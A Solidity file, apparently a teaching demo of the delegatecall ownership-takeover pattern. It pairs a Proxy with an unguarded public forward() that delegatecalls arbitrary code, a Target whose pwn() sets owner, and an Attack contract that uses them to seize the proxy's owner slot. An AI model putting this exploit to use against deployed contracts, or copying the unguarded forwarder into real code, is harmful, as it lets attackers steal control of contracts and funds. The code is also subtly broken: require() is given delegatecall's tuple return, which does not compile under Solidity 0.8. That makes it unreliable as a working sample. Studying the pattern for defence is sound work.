pragma solidity ^0.8.16;

contract Proxy {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function forward(address callee, bytes calldata _data) public {
        require(callee.delegatecall(_data), "Delegatecall failed");
    }
}

contract Target {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract Attack {
    address public proxy;

    constructor(address _proxy) {
        proxy = _proxy;
    }

    function attack(address target) public {
        Proxy(proxy).forward(target, abi.encodeWithSignature("pwn()"));
    }
}
